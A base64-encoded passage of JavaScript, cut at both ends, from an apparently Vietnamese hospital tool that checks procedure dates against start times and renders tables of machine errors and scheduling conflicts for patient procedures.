pbmVMb2cucHVzaCh7DQogICAgICAgICAgICAgICAgICAgIHJvd051bWJlcjogcm93TnVtYmVyLA0KICAgICAgICAgICAgICAgICAgICBwYXRpZW50TmFtZTogbmFtZUluZGV4ICE9PSAtMSA/IHJvd1tuYW1lSW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCgkJCQkJcGF0aWVudElkOiBwYXRpZW50SWRJbmRleCAhPT0gLTEgPyByb3dbcGF0aWVudElkSW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCgkJCQkJcGF0aWVudEFnZTogcGF0aWVudGFnZUluZGV4ICE9PSAtMSA/IHJvd1twYXRpZW50YWdlSW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCiAgICAgICAgICAgICAgICAgICAgcHJvY2VkdXJlOiBwcm9jZWR1cmVOYW1lLA0KICAgICAgICAgICAgICAgICAgICBvcGVyYXRvcjogb3BlcmF0b3JJbmRleCAhPT0gLTEgPyByb3dbb3BlcmF0b3JJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLA0KCQkJCQlkb2N0b3I6IGRvY3RvckluZGV4ICE9PSAtMSA/IHJvd1tkb2N0b3JJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLCAvLyBUaMOqbSBiw6FjIHPhu7kNCiAgICAgICAgICAgICAgICAgICAgZGF0ZTogcHJvY2VkdXJlRGF0ZSB8fCBzdGFydD8uZGF0ZUtleSB8fCAnS2jDtG5nIHjDoWMgxJHhu4tuaCcsDQogICAgICAgICAgICAgICAgICAgIHN0YXJ0VGltZTogc3RhcnQ/LmRpc3BsYXlUaW1lIHx8ICc/PycsDQogICAgICAgICAgICAgICAgICAgIGVuZFRpbWU6IGVuZD8uZGlzcGxheVRpbWUgfHwgJz8/JywNCiAgICAgICAgICAgICAgICAgICAgbWFjaGluZUNvZGU6IG1hY2hpbmVDb2RlDQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9IGNhdGNoIChlcnJvcikgew0KICAgICAgICAgICAgY29uc29sZS5lcnJvcihgTOG7l2kga2nhu4NtIHRyYSBtw6MgbcOheSBkw7JuZyAke3Jvd051bWJlcn06YCwgZXJyb3IpOw0KICAgICAgICB9DQogICAgfSk7DQp9DQoNCi8vIEjDoG0ga2nhu4NtIHRyYSB0aOG7nWkgZ2lhbiBi4bqvdCDEkeG6p3Uga2jDoWMgbmfDoHkgdGjhu7FjIGhp4buHbg0KZnVuY3Rpb24gY2hlY2tEYXRlTWlzbWF0Y2gocHJvY2VkdXJlcywganNvbkRhdGEpIHsNCiAgICBkYXRlTWlzbWF0Y2hMb2cgPSBbXTsNCiAgICANCiAgICBjb25zdCBoZWFkZXJMaW5lMSA9IGpzb25EYXRhWzddIHx8IFtdOw0KICAgIGNvbnN0IGhlYWRlckxpbmUyID0ganNvbkRhdGFbOF0gfHwgW107DQogICAgY29uc3QgY29tYmluZWRIZWFkZXJzID0gaGVhZGVyTGluZTEubWFwKChjb2wsIGluZGV4KSA9PiANCiAgICAgICAgKGNvbCArICcgJyArIChoZWFkZXJMaW5lMltpbmRleF0gfHwgJycpKS50cmltKCkNCiAgICApOw0KDQogICAgLy8gVMOsbSBj4buZdCBuZ8OgeSB0aOG7sWMgaGnhu4duIHbDoCB0aOG7nWkgZ2lhbiBi4bqvdCDEkeG6p3UNCiAgICBjb25zdCBwcm9jZWR1cmVEYXRlSW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gDQogICAgICAgIGguaW5jbHVkZXMoIk5nw6B5IHRo4buxYyBoaeG7h24iKQ0KICAgICk7DQogICAgY29uc3Qgc3RhcnRUaW1lSW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gDQogICAgICAgIGguaW5jbHVkZXMoIlRo4budaSBnaWFuIGLhuq90IMSR4bqndSB0aOG7sWMgaGnhu4duIikNCiAgICApOw0KICAgIA0KICAgIC8vIFTDrG0gY+G7mXQgYsOhYyBz4bu5IGNo4buJIMSR4buLbmgNCiAgICBjb25zdCBkb2N0b3JJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJCw6FjIHPhu7kgY2jhu4kgxJHhu4tuaCIpKTsNCg0KICAgIGlmIChwcm9jZWR1cmVEYXRlSW5kZXggPT09IC0xIHx8IHN0YXJ0VGltZUluZGV4ID09PSAtMSkgew0KICAgICAgICBjb25zb2xlLmxvZygiS2jDtG5nIHTDrG0gdGjhuqV5IGPhu5l0IE5nw6B5IHRo4buxYyBoaeG7h24gaG/hurdjIFRo4budaSBnaWFuIGLhuq90IMSR4bqndSB0aOG7sWMgaGnhu4duIik7DQogICAgICAgIHJldHVybjsNCiAgICB9DQoNCiAgICAvLyBUw6xtIGPDoWMgY+G7mXQga2jDoWMgY+G6p24gdGhp4bq/dA0KICAgIGNvbnN0IHByb2NlZHVyZUluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIlRo4bunIHRodeG6rXQiKSk7DQogICAgY29uc3QgbmFtZUluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIkjhu40gdMOqbiIpKTsNCiAgICBjb25zdCBwYXRpZW50SWRJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJNw6MgQk4iKSk7DQogICAgY29uc3QgcGF0aWVudGFnZUluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIlR14buVaSIpKTsNCiAgICBjb25zdCBvcGVyYXRvckluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIlRo4bunIHRodeG6rXQgY2jDrW5oIikpOw0KDQogICAgY29uc3Qgcm93cyA9IGpzb25EYXRhLnNsaWNlKDkpOw0KICAgIA0KICAgIHJvd3MuZm9yRWFjaCgocm93LCBpbmRleCkgPT4gew0KICAgICAgICBjb25zdCByb3dOdW1iZXIgPSBpbmRleCArIDEwOw0KICAgICAgICANCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgIGlmICghcm93IHx8IHJvdy5sZW5ndGggPT09IDApIHJldHVybjsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgY29uc3QgcHJvY2VkdXJlTmFtZSA9IHJvd1twcm9jZWR1cmVJbmRleF07DQogICAgICAgICAgICBpZiAoIXByb2NlZHVyZU5hbWUgfHwgIVBST0NFRFVSRVNbcHJvY2VkdXJlTmFtZV0pIHJldHVybjsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgY29uc3QgcHJvY2VkdXJlRGF0ZSA9IChyb3dbcHJvY2VkdXJlRGF0ZUluZGV4XSB8fCAnJykudG9TdHJpbmcoKS50cmltKCk7DQogICAgICAgICAgICBjb25zdCBzdGFydFRpbWVWYWx1ZSA9IChyb3dbc3RhcnRUaW1lSW5kZXhdIHx8ICcnKS50b1N0cmluZygpLnRyaW0oKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYgKCFwcm9jZWR1cmVEYXRlIHx8ICFzdGFydFRpbWVWYWx1ZSkgcmV0dXJuOw0KICAgICAgICAgICAgDQogICAgICAgICAgICAvLyBQYXJzZSBuZ8OgeSB0aOG7sWMgaGnhu4duDQogICAgICAgICAgICBsZXQgcHJvY2VkdXJlRGF5LCBwcm9jZWR1cmVNb250aCwgcHJvY2VkdXJlWWVhcjsNCiAgICAgICAgICAgIGlmIChwcm9jZWR1cmVEYXRlLmluY2x1ZGVzKCcvJykpIHsNCiAgICAgICAgICAgICAgICBjb25zdCBwYXJ0cyA9IHByb2NlZHVyZURhdGUuc3BsaXQoJy8nKTsNCiAgICAgICAgICAgICAgICBpZiAocGFydHMubGVuZ3RoID09PSAzKSB7DQogICAgICAgICAgICAgICAgICAgIFtwcm9jZWR1cmVEYXksIHByb2NlZHVyZU1vbnRoLCBwcm9jZWR1cmVZZWFyXSA9IHBhcnRzLm1hcChOdW1iZXIpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYgKCFwcm9jZWR1cmVEYXkgfHwgIXByb2NlZHVyZU1vbnRoIHx8ICFwcm9jZWR1cmVZZWFyKSByZXR1cm47DQogICAgICAgICAgICANCiAgICAgICAgICAgIC8vIFBhcnNlIHRo4budaSBnaWFuIGLhuq90IMSR4bqndQ0KICAgICAgICAgICAgY29uc3Qgc3RhcnRUaW1lID0gcGFyc2VEYXRlVGltZShyb3dbc3RhcnRUaW1lSW5kZXhdLCByb3dOdW1iZXIpOw0KICAgICAgICAgICAgaWYgKCFzdGFydFRpbWUpIHJldHVybjsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgLy8gU28gc8OhbmggbmfDoHkNCiAgICAgICAgICAgIGNvbnN0IFtzdGFydERheSwgc3RhcnRNb250aCwgc3RhcnRZZWFyXSA9IHN0YXJ0VGltZS5kYXRlS2V5LnNwbGl0KCcvJykubWFwKE51bWJlcik7DQogICAgICAgICAgICANCiAgICAgICAgICAgIC8vIEtp4buDbSB0cmEgeGVtIGPDsyBwaOG6o2kgbMOgIFPhuq9jIHRodeG7kWMgdGhhbmcga2jDtG5nDQogICAgICAgICAgICBjb25zdCBpc0hlcmJQcm9jZWR1cmUgPSBwcm9jZWR1cmVOYW1lLnRvTG93ZXJDYXNlKCkuaW5jbHVkZXMoJ3Phuq9jIHRodeG7kWMgdGhhbmcnKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgbGV0IGlzRGF0ZU1pc21hdGNoID0gZmFsc2U7DQogICAgICAgICAgICBsZXQgZXJyb3JNZXNzYWdlID0gJyc7DQogICAgICAgICAgICANCiAgICAgICAgICAgIGlmIChwcm9jZWR1cmVEYXkgIT09IHN0YXJ0RGF5IHx8IHByb2NlZHVyZU1vbnRoICE9PSBzdGFydE1vbnRoIHx8IHByb2NlZHVyZVllYXIgIT09IHN0YXJ0WWVhcikgew0KICAgICAgICAgICAgICAgIGlmIChpc0hlcmJQcm9jZWR1cmUpIHsNCiAgICAgICAgICAgICAgICAgICAgLy8gVuG7m2kgU+G6r2MgdGh14buRYyB0aGFuZzoga2nhu4NtIHRyYSBu4bq/dSB0aOG7qSA2IC0+IHRo4bupIDcsIGNo4bunIG5o4bqtdA0KICAgICAgICAgICAgICAgICAgICBjb25zdCBwcm9jRGF0ZSA9IG5ldyBEYXRlKHByb2NlZHVyZVllYXIsIHByb2NlZHVyZU1vbnRoIC0gMSwgcHJvY2VkdXJlRGF5KTsNCiAgICAgICAgICAgICAgICAgICAgY29uc3Qgc3RhcnREYXRlID0gbmV3IERhdGUoc3RhcnRZZWFyLCBzdGFydE1vbnRoIC0gMSwgc3RhcnREYXkpOw0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgY29uc3QgcHJvY0RheU9mV2VlayA9IHByb2NEYXRlLmdldERheSgpOyAvLyAwPUNOLCAxPVQyLCAuLi4sIDU9VDYsIDY9VDcNCiAgICAgICAgICAgICAgICAgICAgY29uc3Qgc3RhcnREYXlPZldlZWsgPSBzdGFydERhdGUuZ2V0RGF5KCk7DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAvLyBUw61uaCBz4buRIG5nw6B5IGNow6puaCBs4buHY2gNCiAgICAgICAgICAgICAgICAgICAgY29uc3QgdGltZURpZmYgPSBzdGFydERhdGUuZ2V0VGltZSgpIC0gcHJvY0RhdGUuZ2V0VGltZSgpOw0KICAgICAgICAgICAgICAgICAgICBjb25zdCBkYXlEaWZmID0gTWF0aC5jZWlsKHRpbWVEaWZmIC8gKDEwMDAgKiAzNjAwICogMjQpKTsNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIC8vIENo4buJIGNo4bqlcCBuaOG6rW4gbuG6v3U6IA0KICAgICAgICAgICAgICAgICAgICAvLyAtIE5nw6B5IHRo4buxYyBoaeG7h24gbMOgIHRo4bupIDYgKDUpIHbDoCB0aOG7nWkgZ2lhbiBi4bqvdCDEkeG6p3UgbMOgIHRo4bupIDcgKDYpIGhv4bq3YyBjaOG7pyBuaOG6rXQgKDApIGPhu6dhIHR14bqnbiDEkcOzDQogICAgICAgICAgICAgICAgICAgIC8vIC0gQ2jDqm5oIGzhu4djaCBraMO0bmcgcXXDoSAyIG5nw6B5DQogICAgICAgICAgICAgICAgICAgIGlmIChwcm9jRGF5T2ZXZWVrID09PSA1ICYmIChzdGFydERheU9mV2VlayA9PT0gNiB8fCBzdGFydERheU9mV2VlayA9PT0gMCkgJiYgZGF5RGlmZiA8PSAyKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAvLyBI4bujcCBs4buHOiB0aOG7qSA2IC0+IHRo4bupIDcgaG/hurdjIGNo4bunIG5o4bqtdA0KICAgICAgICAgICAgICAgICAgICAgICAgaXNEYXRlTWlzbWF0Y2ggPSBmYWxzZTsNCiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlzRGF0ZU1pc21hdGNoID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGVycm9yTWVzc2FnZSA9IGBT4bqvYyB0aHXhu5FjIHRoYW5nOiBOZ8OgeSB0aOG7sWMgaGnhu4duICgke3Byb2NlZHVyZURhdGV9KSBraMOhYyB24bubaSBuZ8OgeSBi4bqvdCDEkeG6p3UgKCR7c3RhcnRUaW1lLmRhdGVLZXl9KSBraMO0bmcgcGjhuqNpIHkgbOG7h25oIGThu7EgdHLDuS5gOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgLy8gVuG7m2kgdGjhu6cgdGh14bqtdCBraMOhYzogbHXDtG4gYsOhbyBs4buXaQ0KICAgICAgICAgICAgICAgICAgICBpc0RhdGVNaXNtYXRjaCA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgIGVycm9yTWVzc2FnZSA9IGBOZ8OgeSB0aOG7sWMgaGnhu4duICgke3Byb2NlZHVyZURhdGV9KSBraMOhYyB24bubaSBuZ8OgeSBi4bqvdCDEkeG6p3UgKCR7c3RhcnRUaW1lLmRhdGVLZXl9KWA7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiAoaXNEYXRlTWlzbWF0Y2gpIHsNCiAgICAgICAgICAgICAgICBkYXRlTWlzbWF0Y2hMb2cucHVzaCh7DQogICAgICAgICAgICAgICAgICAgIHJvd051bWJlcjogcm93TnVtYmVyLA0KICAgICAgICAgICAgICAgICAgICBwYXRpZW50TmFtZTogbmFtZUluZGV4ICE9PSAtMSA/IHJvd1tuYW1lSW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCiAgICAgICAgICAgICAgICAgICAgcGF0aWVudElkOiBwYXRpZW50SWRJbmRleCAhPT0gLTEgPyByb3dbcGF0aWVudElkSW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCiAgICAgICAgICAgICAgICAgICAgcGF0aWVudEFnZTogcGF0aWVudGFnZUluZGV4ICE9PSAtMSA/IHJvd1twYXRpZW50YWdlSW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCiAgICAgICAgICAgICAgICAgICAgcHJvY2VkdXJlOiBwcm9jZWR1cmVOYW1lLA0KICAgICAgICAgICAgICAgICAgICBvcGVyYXRvcjogb3BlcmF0b3JJbmRleCAhPT0gLTEgPyByb3dbb3BlcmF0b3JJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLA0KICAgICAgICAgICAgICAgICAgICBkb2N0b3I6IGRvY3RvckluZGV4ICE9PSAtMSA/IHJvd1tkb2N0b3JJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLA0KICAgICAgICAgICAgICAgICAgICBwcm9jZWR1cmVEYXRlOiBwcm9jZWR1cmVEYXRlLA0KICAgICAgICAgICAgICAgICAgICBzdGFydFRpbWU6IHN0YXJ0VGltZS5kaXNwbGF5VGltZSwNCiAgICAgICAgICAgICAgICAgICAgc3RhcnREYXRlOiBzdGFydFRpbWUuZGF0ZUtleSwNCiAgICAgICAgICAgICAgICAgICAgbWVzc2FnZTogZXJyb3JNZXNzYWdlDQogICAgICAgICAgICAgICAgfSk7DQogICAgICAgICAgICB9DQogICAgICAgIH0gY2F0Y2ggKGVycm9yKSB7DQogICAgICAgICAgICBjb25zb2xlLmVycm9yKGBM4buXaSBraeG7g20gdHJhIGRhdGUgbWlzbWF0Y2ggZMOybmcgJHtyb3dOdW1iZXJ9OmAsIGVycm9yKTsNCiAgICAgICAgfQ0KICAgIH0pOw0KfQ0KDQoNCg0KDQoNCg0KDQovLyBIw6BtIGhp4buDbiB0aOG7iyBs4buXaSBn4bqvbiBzYWkgbcOheQ0KZnVuY3Rpb24gZGlzcGxheU1hY2hpbmVFcnJvcnMoKSB7DQogICAgY29uc3QgbWFjaGluZUVycm9yTG9nRGl2ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21hY2hpbmVFcnJvckxvZycpOw0KICAgIGNvbnN0IG1hY2hpbmVFcnJvclNlY3Rpb24gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbWFjaGluZUVycm9yU2VjdGlvbicpOw0KICAgIA0KICAgIGlmIChtYWNoaW5lRXJyb3JMb2cubGVuZ3RoID09PSAwKSB7DQogICAgICAgIG1hY2hpbmVFcnJvckxvZ0Rpdi5pbm5lckhUTUwgPSAnPHA+S2jDtG5nIGPDsyBs4buXaSBn4bqvbiBzYWkgbcOheSBuw6BvIMSRxrDhu6NjIGdoaSBuaOG6rW48L3A+JzsNCiAgICAgICAgbWFjaGluZUVycm9yU2VjdGlvbi5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KICAgIA0KICAgIGNvbnN0IHNob3dEb2N0b3IgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2hvd0RvY3RvckNoZWNrYm94JykuY2hlY2tlZDsNCiAgICBjb25zdCBkb2N0b3JDb2x1bW5TdHlsZSA9IHNob3dEb2N0b3IgPyAnJyA6ICdkaXNwbGF5Om5vbmUnOw0KICAgIA0KICAgIGxldCBodG1sID0gYA0KICAgIDx0YWJsZSBjbGFzcz0iZXJyb3ItdGFibGUiPg0KICAgICAgICA8dGhlYWQ+DQogICAgICAgICAgICA8dHI+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlciBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVMOqbiBCTjwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtcHJvY2VkdXJlcyBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVGjhu6cgdGh14bqtdDwvdGg+DQogICAgICAgICAgICAgICAgPHRoIGNsYXNzPSJkb2N0b3ItY29sdW1uIiBzdHlsZT0iJHtkb2N0b3JDb2x1bW5TdHlsZX0iPjxpIGNsYXNzPSJmYXMgZmEtdXNlci1tZCBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gQsOhYyBz4bu5IGNo4buJIMSR4buLbmg8L3RoPg0KICAgICAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLXVzZXItbnVyc2UgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IE5nxrDhu51pIHRo4buxYyBoaeG7h248L3RoPg0KICAgICAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFyIGZhLWNsb2NrIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUaOG7nWkgZ2lhbjwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtbWljcm9jaGlwIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBNw6MgbcOheTwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtZXhjbGFtYXRpb24tdHJpYW5nbGUgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IEzhu5dpPC90aD4NCiAgICAgICAgICAgIDwvdHI+DQogICAgICAgIDwvdGhlYWQ+DQogICAgICAgIDx0Ym9keT5gOw0KICAgIA0KICAgIG1hY2hpbmVFcnJvckxvZy5mb3JFYWNoKGVycm9yID0+IHsNCiAgICAgICAgaHRtbCArPSBgDQogICAgICAgIDx0ciBjbGFzcz0iZXJyb3Itcm93Ij4NCiAgICAgICAgICAgIDx0ZD4ke2Vycm9yLnBhdGllbnROYW1lfSBbPGZvbnQgY29sb3I9InJlZCI+JHtlcnJvci5wYXRpZW50QWdlfTwvZm9udD5dPGJyLz4ke2Vycm9yLnBhdGllbnRJZH08L3RkPg0KICAgICAgICAgICAgPHRkPiR7ZXJyb3IucHJvY2VkdXJlfTwvdGQ+DQogICAgICAgICAgICA8dGQgY2xhc3M9ImRvY3Rvci1jb2x1bW4iIHN0eWxlPSIke2RvY3RvckNvbHVtblN0eWxlfSI+JHtlcnJvci5kb2N0b3IgfHwgJ0tow7RuZyBjw7MnfTwvdGQ+DQogICAgICAgICAgICA8dGQ+JHtlcnJvci5vcGVyYXRvci5yZXBsYWNlKC8sL2csICcnKX08L3RkPg0KICAgICAgICAgICAgPHRkPjxjZW50ZXI+JHtlcnJvci5kYXRlfTxici8+JHtlcnJvci5zdGFydFRpbWV9IOKGkiAke2Vycm9yLmVuZFRpbWV9PC9jZW50ZXI+PC90ZD4NCiAgICAgICAgICAgIDx0ZD4ke2Vycm9yLm1hY2hpbmVDb2RlfTwvdGQ+DQogICAgICAgICAgICA8dGQgY2xhc3M9ImVycm9yLWRldGFpbCI+DQogICAgICAgICAgICAgICAgJHtlcnJvci5tZXNzYWdlfQ0KICAgICAgICAgICAgPC90ZD4NCiAgICAgICAgPC90cj5gOw0KICAgIH0pOw0KICAgIA0KICAgIGh0bWwgKz0gYDwvdGJvZHk+PC90YWJsZT5gOw0KICAgIA0KICAgIG1hY2hpbmVFcnJvckxvZ0Rpdi5pbm5lckhUTUwgPSBodG1sOw0KICAgIG1hY2hpbmVFcnJvclNlY3Rpb24uc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogICAgDQogICAgLy8gQ+G6rXAgbmjhuq10IGRyb3Bkb3duIGzhu41jDQogICAgdXBkYXRlTWFjaGluZU9wZXJhdG9yRmlsdGVyKCk7DQp9DQoNCi8vIEjDoG0gaGnhu4NuIHRo4buLIHh1bmcgxJHhu5l0IG3DoXkNCmZ1bmN0aW9uIGRpc3BsYXlNYWNoaW5lQ29uZmxpY3RzKCkgew0KICAgIGNvbnN0IG1hY2hpbmVDb25mbGljdExvZ0RpdiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdtYWNoaW5lQ29uZmxpY3RMb2cnKTsNCiAgICBjb25zdCBtYWNoaW5lQ29uZmxpY3RTZWN0aW9uID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21hY2hpbmVDb25mbGljdFNlY3Rpb24nKTsNCiAgICANCiAgICBpZiAobWFjaGluZUNvbmZsaWN0TG9nLmxlbmd0aCA9PT0gMCkgew0KICAgICAgICBtYWNoaW5lQ29uZmxpY3RMb2dEaXYuaW5uZXJIVE1MID0gJzxwPktow7RuZyBjw7MgeHVuZyDEkeG7mXQgbcOheSBuw6BvIMSRxrDhu6NjIGdoaSBuaOG6rW48L3A+JzsNCiAgICAgICAgbWFjaGluZUNvbmZsaWN0U2VjdGlvbi5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KICAgICAgIGNvbnN0IHNob3dEb2N0b3IgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2hvd0RvY3RvckNoZWNrYm94JykuY2hlY2tlZDsNCiAgICBjb25zdCBkb2N0b3JDb2x1bW5TdHlsZSA9IHNob3dEb2N0b3IgPyAnJyA6ICdkaXNwbGF5Om5vbmUnOw0KICANCiAgICBsZXQgaHRtbCA9IGANCiAgICA8dGFibGUgY2xhc3M9ImVycm9yLXRhYmxlIj4NCiAgICAgICAgPHRoZWFkPg0KICAgICAgICAgICAgPHRyPg0KICAgICAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLW1pY3JvY2hpcCBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTcOheTwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlciBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVMOqbiBCTjwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtcHJvY2VkdXJlcyBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVGjhu6cgdGh14bqtdDwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXIgZmEtY2xvY2sgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFRo4budaSBnaWFuPC90aD4NCgkJCQk8dGggY2xhc3M9ImRvY3Rvci1jb2x1bW4iIHN0eWxlPSIke2RvY3RvckNvbHVtblN0eWxlfSI+PGkgY2xhc3M9ImZhcyBmYS11c2VyLW1kIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBCw6FjIHPhu7kgY2jhu4kgxJHhu4tuaDwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlci1udXJzZSBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTmfGsOG7nWkgdGjhu7FjIGhp4buHbjwvdGg+DQoJCQkJPHRoPjxpIGNsYXNzPSJmYXIgZmEtY2xvY2sgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IEfhu6NpIMO9IGdp4budPC90aD4NCiAgICAgICAgICAgIDwvdHI+DQogICAgICAgIDwvdGhlYWQ+DQogICAgICAgIDx0Ym9keT5gOw0KICAgIA0KICAgIG1hY2hpbmVDb25mbGljdExvZy5mb3JFYWNoKGNvbmZsaWN0ID0+IHsNCiAgICAgICAgDQoJCS8vVGjDqm0gZMOybmcgdGjDtG5nIHRpbiB24buBIG3DoXkgdsOgIG5nw6B5IHh1bmcgxJHhu5l0IGNoxrBhIGzhu41jDQogICAgICAgLy8gaHRtbCArPSBgDQogICAgIC8vIDx0ciBjbGFzcz0iZXJyb3Itcm93IiBzdHlsZT0iYmFja2dyb3VuZC1jb2xvcjogI2ZmZjNjZDsiPg0KICAgICAgLy8gICAgIDx0ZCBjb2xzcGFuPSI1IiBzdHlsZT0idGV4dC1hbGlnbjogY2VudGVyOyBmb250LXdlaWdodDogYm9sZDsgY29sb3I6ICM4NTY0MDQ7Ij4NCiAgICAgICAvLyAgICAgICA8aSBjbGFzcz0iZmFzIGZhLWV4Y2xhbWF0aW9uLXRyaWFuZ2xlIj48L2k+IA0KICAgICAgIC8vICAgICAgWFVORyDEkOG7mFQgTcOBWTogJHtjb25mbGljdC5tYWNoaW5lQ29kZX0gLSBOR8OAWTogJHtjb25mbGljdC5kYXRlfQ0KICAgICAvLyAgICAgICA8L3RkPg0KICAgICAvLy8gICA8L3RyPmA7DQogICAgICAgDQogICAgICAgIGNvbmZsaWN0LmNvbmZsaWN0UHJvY2VkdXJlcy5mb3JFYWNoKChwcm9jLCBpbmRleCkgPT4gew0KICAgICAgICAgICAgaHRtbCArPSBgDQogICAgICAgICAgICA8dHIgY2xhc3M9ImVycm9yLXJvdyI+DQogICAgICAgICAgICAgICAgJHtpbmRleCA9PT0gMCA/IGA8dGQgcm93c3Bhbj0iJHtjb25mbGljdC5jb25mbGljdFByb2NlZHVyZXMubGVuZ3RofSI+JHtjb25mbGljdC5tYWNoaW5lQ29kZX08L3RkPmAgOiAnJ30NCiAgICAgICAgICAgICAgICA8dGQ+JHtwcm9jLnBhdGllbnROYW1lfSBbPGZvbnQgY29sb3I9InJlZCI+JHtwcm9jLnBhdGllbnRBZ2V9PC9mb250Pl08YnIvPiR7cHJvYy5wYXRpZW50SWR9PC90ZD4NCiAgICAgICAgICAgICAgICA8dGQ+JHtwcm9jLnByb2NlZHVyZX08L3RkPg0KCQkJCSA8dGQ+PGNlbnRlcj4ke2NvbmZsaWN0LmRhdGV9IDxici8+JHtwcm9jLmRpc3BsYXlTdGFydH0g4oaSICR7cHJvYy5kaXNwbGF5RW5kfTwvY2VudGVyPjwvdGQ+DQoJCQkJIDx0ZCBjbGFzcz0iZG9jdG9yLWNvbHVtbiIgc3R5bGU9IiR7ZG9jdG9yQ29sdW1uU3R5bGV9Ij4ke3Byb2MuZG9jdG9yIHx8ICdLaMO0bmcgY8OzJ308L3RkPg0KICAgICAgICAgICAgICAgIDx0ZD4ke3Byb2Mub3BlcmF0b3IucmVwbGFjZSgvLC9nLCAnJyl9PC90ZD4NCiAgICAgICAgICAgJHtpbmRleCA9PT0gMCA/IGA8dGQgcm93c3Bhbj0iJHtjb25mbGljdC5jb25mbGljdFByb2NlZHVy